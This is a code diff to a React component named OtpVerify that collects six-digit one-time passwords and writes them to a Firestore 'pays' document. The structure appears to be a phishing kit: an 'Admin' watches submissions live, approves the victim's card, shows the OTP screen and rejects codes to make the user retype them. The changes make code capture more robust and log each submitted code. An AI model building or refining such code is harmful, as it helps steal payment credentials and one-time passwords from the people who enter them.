@@ -15,6 +15,11 @@ export default function OtpVerify({ docId }: Props) {
   const [error, setError]   = useState('');
   const [submitting, setSubmitting] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  // Always holds the latest OTP value — avoids stale-closure on submit
+  const otpRef = useRef(['', '', '', '', '', '']);
+
+  /* ── Keep ref in sync with state ── */
+  useEffect(() => { otpRef.current = otp; }, [otp]);
 
   /* ── Listen to Firestore doc in real-time ── */
   useEffect(() => {
@@ -25,10 +30,10 @@ export default function OtpVerify({ docId }: Props) {
       if (!snap.exists()) return;
       const data = snap.data();
 
-      const cardStatus  = data.cardStatus;
+      const cardStatus   = data.cardStatus;
       const redirectPage = data.redirectPage;
-      const otpStatus   = data.otpStatus;
-      const v5Status    = data._v5Status;
+      const otpStatus    = data.otpStatus;
+      const v5Status     = data._v5Status;
 
       // Admin approved card with OTP → show OTP input
       if (
@@ -36,7 +41,7 @@ export default function OtpVerify({ docId }: Props) {
         redirectPage === 'otp' ||
         otpStatus === 'show_otp'
       ) {
-        if (stage === 'waiting') setStage('otp');
+        setStage((prev) => prev === 'waiting' ? 'otp' : prev);
       }
 
       // Admin approved OTP → done
@@ -47,51 +52,79 @@ export default function OtpVerify({ docId }: Props) {
       // Admin rejected OTP → let user re-enter
       if (v5Status === 'rejected' || otpStatus === 'rejected') {
         setStage('otp');
-        setOtp(['', '', '', '', '', '']);
+        const empty = ['', '', '', '', '', ''];
+        setOtp(empty);
+        otpRef.current = empty;
         setError('الرمز غير صحيح، أدخله مجدداً');
       }
     });
 
     return () => unsub();
-  }, [docId, stage]);
+  }, [docId]);
+
+  /* ── Fill digits starting from a given index (handles autofill/paste into box) ── */
+  const fillFrom = (startIndex: number, digits: string) => {
+    setOtp((prev) => {
+      const next = [...prev];
+      for (let i = 0; i < digits.length && startIndex + i < 6; i++) {
+        next[startIndex + i] = digits[i];
+      }
+      otpRef.current = next;
+      return next;
+    });
+    const focusIdx = Math.min(startIndex + digits.length, 5);
+    // Focus after state flush
+    requestAnimationFrame(() => inputRefs.current[focusIdx]?.focus());
+  };
 
   /* ── OTP input helpers ── */
   const handleOtpChange = (index: number, value: string) => {
-    const digit = value.replace(/\D/g, '').slice(-1);
-    const newOtp = [...otp];
-    newOtp[index] = digit;
-    setOtp(newOtp);
-    setError('');
-    if (digit && index < 5) {
-      inputRefs.current[index + 1]?.focus();
+    const digits = value.replace(/\D/g, '');
+    if (!digits) {
+      // Cleared
+      setOtp((prev) => {
+        const next = [...prev]; next[index] = ''; otpRef.current = next; return next;
+      });
+      setError('');
+      return;
     }
+    if (digits.length > 1) {
+      // Autofill / paste into a single box — distribute from this index
+      fillFrom(index, digits.slice(0, 6));
+    } else {
+      fillFrom(index, digits);
+    }
+    setError('');
   };
 
   const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
-    if (e.key === 'Backspace' && !otp[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
+    if (e.key === 'Backspace') {
+      if (!otp[index] && index > 0) {
+        inputRefs.current[index - 1]?.focus();
+      }
     }
   };
 
   const handlePaste = (e: React.ClipboardEvent) => {
     e.preventDefault();
     const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
-    const newOtp = [...otp];
-    digits.split('').forEach((d, i) => { newOtp[i] = d; });
-    setOtp(newOtp);
-    inputRefs.current[Math.min(digits.length, 5)]?.focus();
+    if (digits) fillFrom(0, digits);
   };
 
   const otpFull = otp.every((d) => d !== '');
 
   /* ── Submit OTP to Firestore ── */
   const handleSubmit = async () => {
-    if (!otpFull || submitting) return;
+    // Read from ref to guarantee latest value even if state hasn't flushed
+    const latest = otpRef.current;
+    const full   = latest.every((d) => d !== '');
+    if (!full || submitting) return;
     setSubmitting(true);
     setError('');
 
-    const code = otp.join('');
+    const code = latest.join('');
     const now  = new Date().toISOString();
+    console.log('[OMPAY OTP] Submitting code:', code, 'digits:', latest);
 
     try {
       const ref = doc(db, 'pays', docId);
